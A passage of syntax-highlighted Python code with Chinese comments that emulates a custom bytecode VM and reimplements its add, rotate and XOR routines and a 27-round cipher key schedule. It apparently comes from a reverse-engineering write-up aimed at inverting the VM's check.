</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>==</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;CMP R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> == 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>? R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2>=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># 0x80: 把当前 ip 记到 base2，作为“函数起点”</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;SET base2 = ip = 0x{self.ip:04x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x81: 注册函数：table[idx] = base2 + 3</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x81</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;fun_table&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;DEF FN[{idx}] = 0x{self.fun_table[idx]:04x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x82: call 函数：压栈返回地址，再跳转</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x82</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;fun_table&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>idx</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise KeyError(f&#34;function idx {idx} not registered&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>,</span> <span class=n>ret</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=p>(</span><span class=n>ret</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;CALL FN[{idx}] -&gt; 0x{self.ip:04x}, push RET=0x{ret:04x} at dp=0x{self.dp:04x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x83: ret：从栈顶弹出返回地址到 ip</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x83</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>==</span> <span class=mh>0xFFFF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># log(&#34;RET with empty stack -&gt; halt&#34;)</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>lo</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>hi</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=p>(</span><span class=n>hi</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>lo</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;RET to 0x{ret:04x}, new dp=0x{self.dp:04x}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x84: 输出 R[reg]（写到栈上），然后退出 VM</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x84</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x84&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>output</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;RETVAL R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> stored at dp=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># self.run_flag = False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x85: R[reg] = QWORD[mem[dp]] ; dp += 8</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x85</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span> <span class=c1>#raise IndexError(&#34;reg out of range in 0x85&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;POPQ R{reg} = [dp] =&gt; 0x{val:016x}, new dp=0x{self.dp:04x}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x90: 系统调用（这里还没实现）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x90</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>arg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SYSCALL 0x90 arg=0x</span><span class=si>{</span><span class=n>arg</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2> (NOT IMPLEMENTED) -&gt; HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># self.run_flag = False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;UNKNOWN opcode -&gt; HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># self.run_flag = False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>steps</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>a</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>step</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=n>steps</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>output</span>
</span></span><span class=line><span class=cl>        <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;log_file&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_vm_with_ints</span><span class=p>(</span><span class=n>ints</span><span class=p>,</span> <span class=n>vmcode_path</span><span class=o>=</span><span class=s2>&#34;full_vmcode&#34;</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>vmcode_path</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>vm</span> <span class=o>=</span> <span class=n>VM</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>input_ints</span><span class=o>=</span><span class=n>ints</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=n>debug_after_n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>vm</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>out</span><span class=p>,</span> <span class=n>vm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mask64</span> <span class=o>=</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>mask32</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- 基础函数: 与日志同构 ----------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>loop_64bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_A_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_B_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>r1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=n>r0</span> <span class=o>&amp;=</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_C_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_D_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r_in</span> <span class=o>&gt;&gt;</span> <span class=mi>29</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_E_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r1</span> <span class=o>^</span> <span class=n>r0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- 轮常量调度 R2[k] ----------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_r2_schedule</span><span class=p>(</span><span class=n>r</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    只跑 r2,r3,r4,r5 的“下半轮”，得到每一轮上半轮使用的 r2 常量。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>r</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=n>r</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>r4</span> <span class=o>=</span> <span class=n>r</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>r5</span> <span class=o>=</span> <span class=n>r</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>):</span>  <span class=c1># 0..26</span>
</span></span><span class=line><span class=cl>        <span class=n>R2</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0x1a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 最后一轮没有下半轮</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_g_in</span> <span class=o>=</span> <span class=n>r3</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_g_in</span> <span class=o>=</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_g_in</span> <span class=o>=</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_A</span> <span class=o>=</span> <span class=n>func_A_32bit</span><span class=p>(</span><span class=n>r0_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_B</span> <span class=o>=</span> <span class=n>func_B_32bit</span><span class=p>(</span><span class=n>r0_H_A</span><span class=p>,</span> <span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_C</span> <span class=o>=</span> <span class=n>func_C_32bit</span><span class=p>(</span><span class=n>r0_H_B</span><span class=p>,</span> <span class=n>r2_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_D</span> <span class=o>=</span> <span class=n>func_D_32bit</span><span class=p>(</span><span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_E</span> <span class=o>=</span> <span class=n>func_E_32bit</span><span class=p>(</span><span class=n>r0_H_C</span><span class=p>,</span> <span class=n>r1_H_D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 更新到下一轮</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>r1_H_E</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span><span class=p>,</span> <span class=n>r0_H_C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>R2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- 上半轮显式逆 ----------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rol32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
